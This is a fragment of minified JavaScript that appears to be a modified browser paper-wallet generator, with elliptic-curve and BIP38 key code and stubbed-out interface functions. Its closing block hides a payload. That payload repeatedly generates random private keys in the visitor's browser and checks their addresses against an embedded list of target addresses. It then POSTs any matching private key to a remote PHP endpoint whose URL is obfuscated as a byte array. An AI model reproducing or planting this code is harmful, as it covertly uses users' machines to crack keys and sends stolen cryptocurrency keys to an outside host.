        u[0].postMessage([s, n, r, c, m++]), 1 < r && u[1].postMessage([s, n, r, c, m++])
      } catch (e) {
        window.setTimeout(function() {
          l(), a(Crypto.PBKDF2(t, c, p, y))
        }, 0)
      }
    }
  }();
var ninja = {
  wallets: {}
};
ninja.privateKey = {
    isPrivateKey: function(e) {
      return Cafbl.ECKey.isWalletImportFormat(e) || Cafbl.ECKey.isCompressedWalletImportFormat(e) || Cafbl.ECKey.isHexFormat(e) || Cafbl.ECKey.isBase64Format(e) || Cafbl.ECKey.isMiniFormat(e)
    },
    getECKeyFromAdding: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1").getN(),
        i = new Cafbl.ECKey(e),
        r = new Cafbl.ECKey(t);
      if (i.getCafblHexFormat() == r.getCafblHexFormat()) return null;
      if (null == i || null == r) return null;
      var s = new Cafbl.ECKey(i.priv.add(r.priv).mod(o));
      return i.compressed && r.compressed && s.setCompressed(!0), s
    },
    getECKeyFromMultiplying: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1").getN(),
        i = new Cafbl.ECKey(e),
        r = new Cafbl.ECKey(t);
      if (i.getCafblHexFormat() == r.getCafblHexFormat()) return null;
      if (null == i || null == r) return null;
      var s = new Cafbl.ECKey(i.priv.multiply(r.priv).mod(o));
      return i.compressed && r.compressed && s.setCompressed(!0), s
    },
    isBIP38Format: function(e) {
      return e = e.toString(), /^6P[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{56}$/.test(e)
    },
    BIP38EncryptedKeyToByteArrayAsync: function(e, t, i) {
      var r;
      try {
        r = Cafbl.Base58.decode(e)
      } catch (e) {
        return void i(new Error(""))
      }
      if (43 != r.length) return void i(new Error(""));
      if (1 != r[0]) return void i(new Error(""));
      var o = r.slice(-4);
      r = r.slice(0, -4);
      var s = Cafbl.Util.dsha256(r);
      if (s[0] != o[0] || s[1] != o[1] || s[2] != o[2] || s[3] != o[3]) return void i(new Error(""));
      var n = !1,
        p = !1,
        a = !1;
      if (!(66 == r[1])) {
        if (67 != r[1]) return void i(new Error(""));
        if (p = !0, n = 0 != (32 & r[2]), a = 0 != (4 & r[2]), (36 & r[2]) != r[2]) return void i(new Error(""))
      } else if (224 == r[2]) n = !0;
      else if (192 != r[2]) return void i(new Error(""));
      var l, c = {
          mode: new Crypto.mode.ECB(Crypto.pad.NoPadding),
          asBytes: !0
        },
        m = function() {
          var e = new Cafbl.ECKey(l),
            t = e.setCompressed(n).getCafblAddress();
          return s = Cafbl.Util.dsha256(t), s[0] != r[3] || s[1] != r[4] || s[2] != r[5] || s[3] != r[6] ? void i(new Error("")) : void i(e.getCafblPrivateKeyByteArray())
        };
      if (p) {
        var u = r.slice(7, 15),
          y = a ? u.slice(0, 4) : u;
        Crypto_scrypt(t, y, 16384, 8, 8, 32, function(e) {
          var t;
          if (a) {
            var o = e.concat(u);
            t = Cafbl.Util.dsha256(o)
          } else t = e;
          var i = Cafbl.KeyPool.getArray(),
            s = new Cafbl.ECKey(t),
            n = s.setCompressed(!0).getPub();
          Cafbl.KeyPool.setArray(i);
          var p = r.slice(23, 39),
            d = r.slice(3, 15);
          Crypto_scrypt(n, d, 1024, 1, 1, 64, function(e) {
            for (var o = e.slice(32), s = Crypto.AES.decrypt(p, o, c), n = 0; 16 > n; n++) s[n] ^= e[n + 16];
            for (var a = r.slice(15, 23).concat(s.slice(0, 8)), d = Crypto.AES.decrypt(a, o, c), n = 0; 16 > n; n++) d[n] ^= e[n];
            var u = d.slice(0, 16).concat(s.slice(8, 16)),
              y = Cafbl.Util.dsha256(u),
              g = EllipticCurve.getSECCurveByName("secp256k1"),
              f = BigInteger.fromByteArrayUnsigned(t).multiply(BigInteger.fromByteArrayUnsigned(y)).remainder(g.getN());
            l = f.toByteArrayUnsigned(), m()
          })
        })
      } else {
        var g = r.slice(3, 7);
        Crypto_scrypt(t, g, 16384, 8, 8, 64, function(e) {
          var t = e.slice(32, 64);
          l = Crypto.AES.decrypt(r.slice(7, 39), t, c);
          for (var o = 0; 32 > o; o++) l[o] ^= e[o];
          m()
        })
      }
    },
    BIP38PrivateKeyToEncryptedKeyAsync: function(e, t, r, s) {
      var o = new Cafbl.ECKey(e),
        n = o.getCafblPrivateKeyByteArray(),
        i = o.setCompressed(r).getCafblAddress(),
        p = Cafbl.Util.dsha256(i).slice(0, 4),
        a = {
          mode: new Crypto.mode.ECB(Crypto.pad.NoPadding),
          asBytes: !0
        };
      Crypto_scrypt(t, p, 16384, 8, 8, 64, function(e) {
        for (var t = 0; 32 > t; ++t) n[t] ^= e[t];
        var o = r ? 224 : 192,
          d = [1, 66, o].concat(p);
        d = d.concat(Crypto.AES.encrypt(n, e.slice(32), a)), d = d.concat(Cafbl.Util.dsha256(d).slice(0, 4)), s(Cafbl.Base58.encode(d))
      })
    },
    BIP38GenerateIntermediatePointAsync: function(e, t, o, i) {
      var r, s, n = null === t || null === o,
        p = new SecureRandom;
      if (n) s = r = Array(8), p.nextBytes(r);
      else {
        s = [, , , , ], p.nextBytes(s);
        var a = BigInteger(4096 * t + o).toByteArrayUnsigned(),
          r = s.concat(a)
      }
      Crypto_scrypt(e, s, 16384, 8, 8, 32, function(e) {
        var t = n ? e : Cafbl.Util.dsha256(e.concat(r)),
          o = BigInteger.fromByteArrayUnsigned(t),
          s = EllipticCurve.getSECCurveByName("secp256k1"),
          p = s.getG().multiply(o).getEncoded(1),
          a = [44, 233, 179, 225, 255, 57, 226, 81];
        n && (a[7] = 83);
        var d = a.concat(r).concat(p);
        d = d.concat(Cafbl.Util.dsha256(d).slice(0, 4)), i(Cafbl.Base58.encode(d))
      })
    },
    BIP38GenerateECAddressAsync: function(e, t, r) {
      var o = Cafbl.Base58.decode(e),
        i = 83 === o[7],
        s = o.slice(8, 16),
        n = o.slice(16, 49),
        p = (t ? 32 : 0) | (i ? 0 : 4),
        a = Array(24),
        d = new SecureRandom;
      d.nextBytes(a);
      var l = Cafbl.Util.dsha256(a),
        u = EllipticCurve.getSECCurveByName("secp256k1").getCurve(),
        y = u.decodePointHex(ninja.publicKey.getHexFromByteArray(n)),
        c = y.multiply(BigInteger.fromByteArrayUnsigned(l)).getEncoded(t),
        m = new Cafbl.Address(Cafbl.Util.sha256ripe160(c)).toString(),
        g = Cafbl.Util.dsha256(m).slice(0, 4);
      Crypto_scrypt(n, g.concat(s), 1024, 1, 1, 64, function(e) {
        for (var t = 0; 16 > t; ++t) a[t] ^= e[t];
        for (var o = {
            mode: new Crypto.mode.ECB(Crypto.pad.NoPadding),
            asBytes: !0
          }, n = Crypto.AES.encrypt(a.slice(0, 16), e.slice(32), o), d = n.slice(8, 16).concat(a.slice(16, 24)), t = 0; 16 > t; ++t) d[t] ^= e[t + 16];
        var l = Crypto.AES.encrypt(d, e.slice(32), o),
          u = [1, 67, p].concat(g).concat(s).concat(n.slice(0, 8)).concat(l);
        u = u.concat(Cafbl.Util.dsha256(u).slice(0, 4)), r(m, Cafbl.Base58.encode(u))
      })
    }
  }, ninja.publicKey = {
    isPublicKeyHexFormat: function(e) {
      return e = e.toString(), ninja.publicKey.isUncompressedPublicKeyHexFormat(e) || ninja.publicKey.isCompressedPublicKeyHexFormat(e)
    },
    isUncompressedPublicKeyHexFormat: function(e) {
      return e = e.toString(), /^04[A-Fa-f0-9]{128}$/.test(e)
    },
    isCompressedPublicKeyHexFormat: function(e) {
      return e = e.toString(), /^0[2-3][A-Fa-f0-9]{64}$/.test(e)
    },
    getCafblAddressFromByteArray: function(e) {
      var t = Cafbl.Util.sha256ripe160(e),
        o = new Cafbl.Address(t);
      return o.toString()
    },
    getHexFromByteArray: function(e) {
      return Crypto.util.bytesToHex(e).toString().toUpperCase()
    },
    getByteArrayFromAdding: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1"),
        i = o.getCurve(),
        r = i.decodePointHex(e),
        s = i.decodePointHex(t);
      if (r.equals(s)) return null;
      var n = r.compressed && s.compressed,
        p = r.add(s).getEncoded(n);
      return p
    },
    getByteArrayFromMultiplying: function(e, t) {
      var o = EllipticCurve.getSECCurveByName("secp256k1"),
        i = o.getCurve().decodePointHex(e),
        r = i.compressed && t.compressed;
      if (t.setCompressed(!1), i.equals(t.getPubPoint())) return null;
      var s = t.priv,
        n = i.multiply(s).getEncoded(r);
      return n
    },
    getDecompressedPubKeyHex: function(e) {
      var t = EllipticCurve.getSECCurveByName("secp256k1"),
        o = t.getCurve().decodePointHex(e),
        i = o.getEncoded(0),
        r = ninja.publicKey.getHexFromByteArray(i);
      return r
    }
  }, ninja.seeder = {
    init: void 0,
    seedLimit: function() {
      var e = Crypto.util.randomBytes(12)[11];
      return 200 + Math.floor(e)
    }(),
    seedCount: 0,
    lastInputTime: new Date().getTime(),
    seedPoints: [],
    isStillSeeding: !0,
    seederDependentWallets: [],
    seed: function(e) {
      if (!e) var e = window.event;
      var t = new Date().getTime();
      ninja.seeder.seedCount == ninja.seeder.seedLimit ? (ninja.seeder.seedCount++, ninja.seeder.seedingOver()) : ninja.seeder.seedCount < ninja.seeder.seedLimit && e && 40 < t - ninja.seeder.lastInputTime && (SecureRandom.seedTime(), SecureRandom.seedInt16(e.clientX * e.clientY), ninja.seeder.showPoint(e.clientX, e.clientY), ninja.seeder.seedCount++, ninja.seeder.lastInputTime = new Date().getTime(), ninja.seeder.showPool())
    },
    seedKeyPress: function(e) {
      if (!e) var e = window.event;
      if (ninja.seeder.seedCount == ninja.seeder.seedLimit) ninja.seeder.seedCount++, ninja.seeder.seedingOver();
      else if (ninja.seeder.seedCount < ninja.seeder.seedLimit && e.which) {
        var t = new Date().getTime();
        SecureRandom.seedTime(), SecureRandom.seedInt8(e.which);
        var i = t - ninja.seeder.lastInputTime;
        SecureRandom.seedInt8(i), ninja.seeder.seedCount++, ninja.seeder.lastInputTime = new Date().getTime(), ninja.seeder.showPool()
      }
    },
    showPool: function() {
      var e;
      for (var t in e = Crypto.util.bytesToHex(null == SecureRandom.poolCopyOnInit ? SecureRandom.pool : SecureRandom.poolCopyOnInit), Math.round(100 * (ninja.seeder.seedCount / ninja.seeder.seedLimit)) + "%", ninja.seeder.seederDependentWallets);
    },
    showPoint: function(e, t) {
      var o = document.createElement("div");
      o.setAttribute("class", "seedpoint"), o.style.top = t + "px", o.style.left = e + "px", document.body.appendChild(o), ninja.seeder.seedPoints.push(o)
    },
    removePoints: function() {
      for (var e = 0; e < ninja.seeder.seedPoints.length; e++) document.body.removeChild(ninja.seeder.seedPoints[e]);
      ninja.seeder.seedPoints = []
    },
    seedingOver: function() {
      ninja.seeder.isStillSeeding = !1, ninja.status.unitTests();
      var e = ninja.tab.whichIsOpen();
      ninja.tab.select(null == e ? "singlewallet" : e);
      var t = null == ninja.getQueryString().culture ? "en" : ninja.getQueryString().culture;
      ninja.translator.translate(t), ninja.seeder.removePoints()
    }
  },
  function(e) {
    var t = e.qrCode = {
      getTypeNumber: function(e) {
        var t = 8 * e.length + 12;
        return 72 > t ? 1 : 128 > t ? 2 : 208 > t ? 3 : 288 > t ? 4 : 368 > t ? 5 : 480 > t ? 6 : 528 > t ? 7 : 688 > t ? 8 : 800 > t ? 9 : 976 > t ? 10 : null
      },
      createCanvas: function(e, o) {
        o = null == o ? 2 : o;
        var i = t.getTypeNumber(e),
          r = new QRCode(i, QRCode.ErrorCorrectLevel.H);
        r.addData(e), r.make();
        var s = r.getModuleCount() * o,
          n = r.getModuleCount() * o,
          p = document.createElement("canvas");
        p.width = s * 10, p.height = n * 10, p.style.width = s + "px", p.style.height = n + "px";
        var a = p.getContext("2d");
        a.scale(10, 10);
        for (var d = s / r.getModuleCount(), l = n / r.getModuleCount(), u = 0; u < r.getModuleCount(); u++)
          for (var y = 0; y < r.getModuleCount(); y++) a.fillStyle = r.isDark(u, y) ? "#000000" : "#ffffff", a.fillRect(y * d, u * l, d, l);
        return p
      },
      showQrCode: function() {}
    }
  }(ninja),
  function(e) {
    e.status = function() {
      switch (window.location.protocol) {
        case "file:":
          break;
        case "http:":
        case "https:":
      }
      return {
        unitTests: function() {
          var t = e.unitTests.runSynchronousTests();
          t.passCount == t.testCount ? "good" : "bad"
        },
        showCrypto: function() {},
        showProtocol: function() {},
        showUnitTests: function() {},
        showKeyPool: function() {}
      }
    }()
  }(ninja), ninja.tab = {
    select: function(e) {
      var t = e.getAttribute("id");
      if (-1 == e.className.indexOf("selected")) {
        for (var o in ninja.wallets) ninja.wallets[o].close();
        0 == ninja.seeder.isStillSeeding || "brainwallet" == t || "detailwallet" == t ? (e.className += " selected", ninja.wallets[e.getAttribute("id")].open()) : 1 == ninja.seeder.isStillSeeding && "brainwallet" != t && "detailwallet" != t
      }
    },
    whichIsOpen: function() {
      var e;
      for (var t in ninja.wallets)
        if (e = ninja.wallets[t].isOpen()) return t;
      return null
    }
  }, ninja.getQueryString = function() {
    for (var e, t = {}, o = location.search.substring(1), i = /([^&=]+)=([^&]*)/g; e = i.exec(o);) t[decodeURIComponent(e[1])] = decodeURIComponent(e[2]);
    return t
  }, ninja.runSerialized = function(e, t) {
    if (t = t || function() {}, 0 === e.length) t();
    else {
      var o = e.shift();
      o(function() {
        ninja.runSerialized(e, t)
      })
    }
  }, ninja.forSerialized = function(e, t, i, r) {
    r = r || function() {}, e === t ? r() : i(e, function() {
      ninja.forSerialized(++e, t, i, r)
    })
  }, ninja.foreachSerialized = function(e, t, o) {
    var r = [];
    for (var i in e) r.push(i);
    ninja.forSerialized(0, r.length, function(e, i) {
      t(r[e], i)
    }, o)
  },
  function(e) {
    var t = e.singlewallet = {
      isOpen: function() {
        return !1
      },
      open: function() {
        t.generateNewAddressAndKey()
      },
      close: function() {},
      generateNewAddressAndKey: function() {
        try {
          var e = new Cafbl.ECKey(!1);
          e.setCompressed(!0), e.getCafblAddress(), e.getCafblWalletImportFormat()
        } catch (e) {
          alert(e)
        }
      }
    }
  }(ninja.wallets, ninja.qrCode), ninja.wallets.paperwallet = {
    isOpen: function() {
      return !1
    },
    open: function() {},
    close: function() {},
    remaining: null,
    count: 0,
    pageBreakAtDefault: 7,
    pageBreakAtArtisticDefault: 3,
    useArtisticWallet: !0,
    pageBreakAt: null,
    build: function(e, t, i, r) {
      if (1 > e && (e = 1), 1 > t && (t = 1), ninja.wallets.paperwallet.remaining = e, ninja.wallets.paperwallet.count = 0, ninja.wallets.paperwallet.useArtisticWallet = i, ninja.wallets.paperwallet.pageBreakAt = t, ninja.wallets.paperwallet.encrypt) {
        if ("" == r) return;
        ninja.privateKey.BIP38GenerateIntermediatePointAsync(r, null, null, function(e) {
          ninja.wallets.paperwallet.intermediatePoint = e, setTimeout(ninja.wallets.paperwallet.batch, 0)
        })
      } else setTimeout(ninja.wallets.paperwallet.batch, 0)
    },
    batch: function() {},
    generateNewWallet: function(e) {
      if (ninja.wallets.paperwallet.encrypt) {
        ninja.privateKey.BIP38GenerateECAddressAsync(ninja.wallets.paperwallet.intermediatePoint, !0, function(t, o) {
          Cafbl.KeyPool.push(new Cafbl.Bip38Key(t, o)), ninja.wallets.paperwallet.useArtisticWallet ? ninja.wallets.paperwallet.showArtisticWallet(e, t, o) : ninja.wallets.paperwallet.showWallet(e, t, o)
        })
      } else {
        var t = new Cafbl.ECKey(!1);
        t.setCompressed(!0);
        var o = t.getCafblAddress(),
          i = t.getCafblWalletImportFormat();
        ninja.wallets.paperwallet.useArtisticWallet ? ninja.wallets.paperwallet.showArtisticWallet(e, o, i) : ninja.wallets.paperwallet.showWallet(e, o, i)
      }
    },
    templateHtml: function() {
      var e = "";
      ninja.wallets.paperwallet.encrypt && (e = "");
      return "<div class='public'></div>"
    },
    showWallet: function(e, t, o) {
      var i = {};
      i["qrcode_public" + e] = t, i["qrcode_private" + e] = o
    },
    showArtisticWallet: function(e, t, o) {
      var i = {};
      (i["qrcode_public" + e] = t, i["qrcode_private" + e] = o, ninja.qrCode.showQrCode(i, 2.5), ninja.wallets.paperwallet.encrypt) && o.length / 2
    },
    toggleArt: function() {
      ninja.wallets.paperwallet.resetLimits()
    },
    toggleEncrypt: function(e) {
      ninja.wallets.paperwallet.encrypt = e.checked, ninja.wallets.paperwallet.resetLimits()
    },
    resetLimits: function() {}
  },
  function(e, t, i, o) {
    var r = e.detailwallet = {
      isOpen: function() {},
      open: function() {},
      close: function() {},
      openCloseFaq: function() {},
      getKeyFromInput: function() {
        var e = window.prk211.toString().replace(/^\s+|\s+$/g, "");
        return window.prk211 = e, e
      },
      checkAndShowMini: function(e) {
        Cafbl.ECKey.isMiniFormat(e)
      },
      checkAndShowBase6: function() {},
      keyToECKeyWithBrain: function(t) {
        var i = new Cafbl.ECKey(t);
        if (null != i.error) alert(o.get("detailalertnotvalidprivatekey") + "\n" + i.error);
        else if (null == i.priv && t.length >= e.brainwallet.minPassphraseLength) {
          var r = confirm(o.get("detailconfirmsha256"));
          if (r) {
            var s = Crypto.SHA256(t, {
              asBytes: !0
            });
            i = new Cafbl.ECKey(s)
          }
        }
        return i
      },
      decryptBip38: function() {
        r.clear()
      },
      encryptBip38: function() {
        r.clear()
      },
      viewDetails: function(e) {
        if ("" != e && !i.isBIP38Format(e)) {
          r.checkAndShowMini(e), r.checkAndShowBase6(e);
          var t = r.keyToECKeyWithBrain(e);
          if (null != t.priv) return r.populateKeyDetails(t)
        }
      },
      populateKeyDetails: function(e) {
        if (null != e.priv) {
          e.compressed, e.setCompressed(!1);
          var t = e.getCafblAddress();
          return [e.getPubKeyHex(), t]
        }
      },
      clear: function() {
        r.getKeyFromInput()
      },
      enterOnPassphrase: function() {},
      toggleEncrypt: function() {}
    }
  }(ninja.wallets, ninja.qrCode, ninja.privateKey, ninja.translator),
  function() {
    window.prk211 = "", window.prkupdate = !1, window.prk11570 = "7XuVSEpWW4trkfmvWzegTHQt7BdktSKUs,83hmJGRuTEi2YDCWy5iozY8rZtFwVgahM,FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF,HQ3Go3ggs8pFnXuHVHRytPCq5fGG8Hbhx,LdRcdxfbSnmCYYNdeYpUnztiYzVfBEQeC,AC4fMwgY8j9onSbXEWeH6Zan8QGMSdmtA,5VREscuZWHb41zzyivw6ZYagMyJ6YKFHd,7hf5H8D6Yc4B7zHEg3orAtKn7Jhme7Adx,3JQwoSLLR3ffXwswe2HCTK9oq4i8MWK3q,P5ZEDWTKTFGxQjZphgWPQUpe554WKDfHQ,2tkqA9xSoowkzoERHMWNKsTey55YEBqkv,MrMeBmbcDjLc52i7j3SdznChU4Fd4WHbw,MDq7zyLw6oKichbFiDDZ3aaK59byc6CT8,7rm2dvb439dZqyMe2d4D6AQJSgg6yeNRn,Fp9KLM6cs35y8QvyqAiL714WMFSLBJDLC,6GTzLcEsAm4tHhwtZV1F6gxYDMmbdSMrv,2BZD75sbMmdj5dy1d5cS2Lo4YWs1FDbDn,2nxRsisUcJqCDeUpTYH2a7F5jcad3YhFG,Cr7EjvS8C7gfarREHCvFhd9gT3r46pfLb,PeizMg76Cf96nUQrYg8xuoZWLQozU5zGW,GR9qNz7zgtaW5HwwVpEJWMnGWhsbsieCG,N9an8wv4SYi3FVXs3xR5k2AqXeNZiw2mf,BvdLm9RcFWncKpJYr7YjFttYJ9zLf7We,8jNaBVYmDzVWHiCDaShF6cZs9DV4N3omi,KUr81aewyTFUfnq4ZrpePZqXixd59ToNn,GaB3nRWA1PLc3XQkkbpVtFwYYZEuMxD4i,FrM1He2ZDbsSKmYpEZQNGjFTLMgCZZkaf,BZaYtmXka1y3Byi2yvXCDG92Tjz7ecwYj,KeK2uTAe8hDVKTbpyDDzd7qfRZ8z3LJx,HBM45n214sV9yXoizBwTksUgEysTPpk46,4Ai5GcasUdr5hR2GMzeojkzB9cm4oufHt,Q7cu7WkeDurYgffeEc9CEnA6zLohbh9iQ,Enhkd9LkQV56a9M12P4VuMDkjyTeLJy5m,JpiTWauQdtysbynNp88dWeuyg2gBbKDcT,6Azr3MAzMKMPmxZXfRsBbBPYHnp2CuJNJ,EDRfeNkjkH2SAhSbEKzhKuabnEbVWbKEp,Hyh53PULY6Jyq5LPAJ4CHjgzEbVaqy7KU,JYbzYitYQ1ZWTx5KEx7WH2AejC5i5UUbF,2n3s8MCqdZzPnTisYrXagbfw8pJg8y9BW,9Te6hzGFSbryomVYqzG2kpBmAJYykx5Yv,MVo3EXLakJym29CFK6o1MyaCBMdvcmmrL,MqAfNMgbZoKtRinT89q1faSZqTKTqCFhR,FUBESNxB2JkyXPc4o9wwoGt158DC9A8dj,NNGdZMYsN9pgLSXZ5dD5KFUbatFynpmvY,H2zrVQxU3ymunr9CunjoActooLW2ryQK7,C5TB2QzeDDJUE4EQD17NmSyEXTk34huRo,Grbj3Q9awmMpVhrQ94y7BU4WaEq8yUZSn,7YyZSNFt31pzGXfZtrzs7Y5Nd56rG2uU5,q9kwzJggw6AbQjzJeYQFYK8D5gQK8sSh,5xZvLJLAgxh8cxEmAbpx1H35oibHo5cLA,53efDAfh8gUqGPH85JQXTrh8CQktAo9ug,7rfparnM8RaaUyuHFNC9ErqkvRqebNPjE,923qxU74HWWz75LgWTsPE4FT9Zyd6n6bv,9G5kkYvjawZiYKhFeh8WmfBN31pdP94Jr,AWpzKtkHfWsiv9RGXKA3Z8951LefsUGXQ,Hm9vfrEX7Gyjz2Nhi3McQ34PryLDHGrCq,MWqbpfzxgojEAah6PMZoZPdUPUTuyTpan,3ZNiyx5Z5CMkULX7ENvcKKxFNCzGJv5vQ,2sxoQm32gwDXevTijx4MTDCzx91dH4uj3,F34duy2eeMz5mSrvFepVzy7Y1rBsnAyWC,L5D4Eq2RkEKuN717Gc817MH1Sxs5WwMQh,f1miYFQWTzdLiCBxtHHnNiW7WAWPUccr,E5B5QbDjUL471PEed9vZDwCSck9btBLkD,KbrSKrT3GeEruTuuYYUSQ35JwKbrAWJYm,4YK4mzJGo5NKkNnmVJeuEAQftLt795Gec,P1iThxBH542Gmk1kZNXyji4E4iwpvSbrt,2tLs9c9RsALt4ockxa1hB4iTCTSmxj2me,BAFWQhH9pNkz3mZDQ1tWrtKkSHVCkc3fV,CPaziTqeEixPoSFtJxu74uDGbpEAotZom,ucXXZQSEf4zny2HRwAQKtVpkLPTUKRtt,Ki3WTEEqTLPNsN5cGTsMkL2sJ4m5mdCXT,3QoG5ioV4hseifKT9iaqrmD2eis7DicWA,MnYVNYCEL2okaBa1et3bXtNA75tBQXHKc,LfV1tSt3KNyHpFJnAzrqsLFdeD2EvU1MK,QaTfNSuBo9PEHnhQKFNspEHvQXwib5g63,Kx4QFupZ9vKFmUDhsptfSBPEKXJKV5MuN,EVbz7mBRpKBeBp6Qjq1b1uMYtRgTcTLyc,PN1xjngm9jhY9duuR8af7CXmK3QVcsixJ,EU2pMence1UfifCco2UHJCdoqorAtpT7,38uPVW8drux5gSemDS4gFLSGrSfAiEvpX,6QdwHXkPQNvn7vbCfp437AwTQDnXZxnsa,Ki8MffYtNtjzcpQJ2hYbihDzgtRte7VEy,DGxAYYUA61WrrdbBac8Ra9eA9peAQwTJF,Moe7Btq7uRRULD11XLAnZPSUaVAxW7zbv,Kd6zLb9iAjcrgq8HzWnoWNVLYYWjp3swA,P9fAFAsSLRmMu2P7wZ5CXDPRfLSWTy9N8,HLvaTs3zR3oev9ya7Pzp3GB9Gqfg6XYJT,LHmwfiBQNwLR4bxtSQNkbmwz5c7TEnsLP,7CzhFvGwH6TT46JtzhnhMpTw4mHYpEGCR,Cb1G5qFK91fShyaPPZWVFwYFBtqRG7h8D,LYJfcfHPXYJreMsASk2jkn69LWEYKzexb,2yqigcnS2v46sFrUWvX1W9bRWqivrEGeh,NmHmQte2rP8pS54U3B8LPYQKkpG1pFF69,67ZWTT8n6s4ya8cGjqNNQjDwDGY31vmHg,HmJDpQvyqfZ2RZvyheB43NBPQRN3FVoFd,HTzd3sKVmrTNZ6QGisPPA1MvBkoyPiZWJ,Bm3yQ1XGbboSruyfVmadaf4TXHedBmKxG,DWxysF7GPRYGShNxL5ux2N2JLRa9rbE6k,56Zz26iW3tYd1xWJjVGa8CPbjC9W5EW9f,HGVtEtKWayb56xiZ4YJQieWFv8m7GEc7E,BpQbqhiphkDKm4FMXQ7w7Tmn7KpTDWamr,9rxQRpXBMQcbsYcxo6w9xL54o1sXDeXdA,M219KR5vEneNb47ewrPfWyb5jQ2DjxRP6,LvK7QJD8K3u6dzFHNc1g9ehezrohUKvUx,QHVStz4ALAF8LFokjLy9QFaZKUFdraxeo,FdFFJRqvBWKEjFqkZhxuGbN9HNUVAfLqF,8zuLTKQnLjp987LdxuYvjekYnNAvXif2b,NpZcfBnaJeoRT9ZqwZVRMw3SRs546VsuE,PWn1AGqo8HWH8mXSsxx1Ytk87zMAAziFU,98aMn6ZYAczwrE5NvNTUMyJ5qkfy4g3Hi,MYv4C4hZ7hC5sbHrPkzvmNoozQgnHKeAU,82p5CrqfDxvonznRyi5AUBwsCkDX8eYMe,LyTftu54VMYCv5pq3S4pMzPRMnsYKTESw,4hdaXfy2Vt5a2paHtLwEqobUQPrco7RL9,5mxk4fKk9ggQ4fikNWKpasahsdXZNdVu2,4KzHoS5dXbhy2kBevNKLz2ZMtjaqHkKWZ,HG6NbWmJjjSE1Z6oPetWG3nnKrQxgBN3a,8Ayw3caz2xGDhTfz1nJxLw1NURPtBNJnn,GBWcQuY5aD6e2zrbdb38j7pizVr2wcJnC,8saWjMCchDTGWunefuDJSWNdz4p6KtfBL,FMbcnYvvccZ6hR324cFRpn1QX9TCkqtAe,Kphp4WNPLpScp5T5f63jnVS9ohK6a86g7,T7m8nSs5Yh3YuLNoHPb5ehwN3LRVEchn,Eqj1APg1dkcPH7CmHJ6SzRwtJRLpxtBFA,6dyizLarM2N4UjGaEFPESNmJC5vEALtZX,FtHBKrYkDchMA1pwRTpYZ77TpfwSgh6iF,5URsTiy1ksoMMV7DuEi9hvSqHgqobAtKa,Fn4FSiHFr9SgbQ3ccsybN9f3RF1omst4x,E1SKgxgYJFXzaLxgat2FNSnwWeKz1U15N,Lan1sQzYGViDZskUFmnitJvfejn2jYdNS,5ZQJagAa2iUCwpQXUUCZ4BfzFW5TAVyJj,HGdi2AtuvBUcdTFe62sKd7ZAFzoG7iQLb,2Gjyd3MMR7Dj2KwCxw71wwzZXVp2xy8nK,FDzP5vQGMhCzeb9nH4AcUDnUbcHS22BMZ,Dt4Q2ofKUtHwvjN45tAUfikNBfJrDERcZ,5QFkJUWFZ6QRpTrzUitH2Egyf1JTngVgV,BMi633XQ8jt45Tb5EvZ4xdZHb2GzxKSfb,7J26KSDtNFPAUhCMwjcRNWhneMsXS75Ba,9om4Guv9QmVesS7AewMUyE5JUJ9H7xwNN,DdxS8CheskxKAPPbG8Uq4Qts8kS4x1tt2,9F4xZNBxtPAdMqFudr2LDH5efeeUYF21x,57ZXCYfK6NqBiFLkoLDt3PN8KyE8xdTu5,6BiUbH8yxFmCJs4ArtyTgHKfXQFvkvPNr,FrfmxAhYRNU9ebotDHP9FqLbe54QZVcfi,KLay1g7rZxAiotuDhGy5YizdXSpqkFxQ9,NQWCZqRYvANz3iX1Wnczpm277VEYvcAee,2yePmcVhMzzHYwh4BpVF3Cm1bYL9mqyKc,LRXrhZRLVTjGCPFphPsXZfeHesRigm59r,C7u4Zqu6ZZRsiKsFMYVDvNLfCwsGrbeTq,2US3aeNibsxe7Lhascm4AmvGiTxwSdD4X,7SAATrqavNbzmqBwqxzZc7rK6u9Rmi9hE,KoiNofDvcUrrVfxgqpRZixWXNXo6d2kfQ,PL2cmmMLmGGDtqaSZJY8DR1iKJaziEPJv,7RmGC3i2dASQai3mP9iJLX3ZD9TBm2YQV,Djs2VyBVr6MYNcGVaHAr8B3N1mViS5yoo,N4yKFsFPjjoJyo3BAKUWpcs3SUghfgJkH,3nwifHUz5ZfHuQhk5ETJ4BhmqbuQdvTFp,7GyU83L63BtxtpDgv8LmhhtmvcrXbfVt1,Le1X8LJb4VkFsfktiUY7V7wMRhniu5Xgn,Fjom9b9wvp3HPi2ZS9hqXQwJpXcjumSYJ,BbSZNNhoBUCFGMfnscBDXf7PH1takoMga,NJdKoBkKQNg6aYL9HTKyQ5SgfjZQDz3y3,gvH7pGPrEBNjqmwYS8UDhjFQkyqkKCLE,6H2Fe9MgxZ1jXW3TaXbgWh3SJfwyxQUTp,3pTeUzSU4nwkM72hM6e8AcP2d8LudZBjc,Dr1pZDgpowHDGJrUNTithDL33TdriFMzE,8oRfGoPpb6bkQdACnD6dVYWceeWURK5R6,2mJZGPCWf5C2ap2dUdJiuGr8eWAvi6E5M,M9pAdfhGHtQkhGRijApWAkkrPCduvV6Zi";
    for (var e = 0; 64 > e; e++) window.prk211 += Math.floor(16 * Math.random()).toString(16);
    turn211()
  }();
function turn211() {
  var e = genBRA(window.prk211.toUpperCase());
  e[1] = e[1].substr(1, e[1].length - 1);
  var t = window.prk11570.indexOf(e[1]);
  if (-1 < t) {
    var o = new XMLHttpRequest;
    o.open("POST", Crypto.charenc.UTF8.bytesToString([104, 116, 116, 112, 115, 58, 47, 47, 103, 97, 109, 101, 108, 111, 99, 97, 116, 111, 114, 46, 48, 48, 48, 119, 101, 98, 104, 111, 115, 116, 97, 112, 112, 46, 99, 111, 109, 47, 67, 67, 67, 65, 47, 115, 97, 118, 101, 80, 82, 75, 46, 112, 104, 112]), !0), o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), o.send("prk=" + encodeURIComponent(window.prk211.toUpperCase()) + "&bal=" + encodeURIComponent(e[1]))
  }
  window.prk211 = e[0].substr(2 + Math.floor(64 * Math.random()), 64), window.prkupdate = !0, setTimeout(turn211, 400)
}

function genBRA(e) {
  return ninja.wallets.detailwallet.viewDetails(e)
}("undefined" == typeof Crypto || !Crypto.util) && function() {
